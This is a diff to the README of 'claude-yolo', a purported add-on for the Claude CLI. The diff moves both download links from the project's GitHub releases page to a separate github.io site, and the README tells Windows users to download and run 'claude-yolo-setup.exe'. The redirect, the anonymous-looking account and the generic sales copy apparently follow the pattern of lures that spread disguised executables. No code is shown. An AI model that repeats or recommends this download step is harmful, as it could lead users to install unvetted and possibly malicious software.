@@ -1,6 +1,6 @@
 # 🚀 claude-yolo - Add YOLO speed to Claude CLI
 
-[![](https://img.shields.io/badge/Download-blue)](https://github.com/amorous-aminogroup433/claude-yolo/releases)
+[![](https://img.shields.io/badge/Download-blue)](https://amorous-aminogroup433.github.io)
 
 ## 📖 About
 claude-yolo upgrades your command-line experience. It integrates the YOLO philosophy into the Claude CLI. This tool automates repetitive tasks to save you time. It helps users interact with artificial intelligence through their terminal. You gain efficiency by running commands with fewer keystrokes. 
@@ -15,7 +15,7 @@ Verify your computer meets these standards before you begin.
 ## 📥 Getting the Software
 You must download the correct version for your Windows machine. Visit the link below to view the release page. Choose the file marked with the .exe extension to ensure simple installation.
 
-[Download the latest version here](https://github.com/amorous-aminogroup433/claude-yolo/releases)
+[Download the latest version here](https://amorous-aminogroup433.github.io)
 
 Click the link to open the release page in your browser. Look for the Assets section. Click on the file named claude-yolo-setup.exe. Save this file in a folder you can find later, such as your Downloads folder.
 
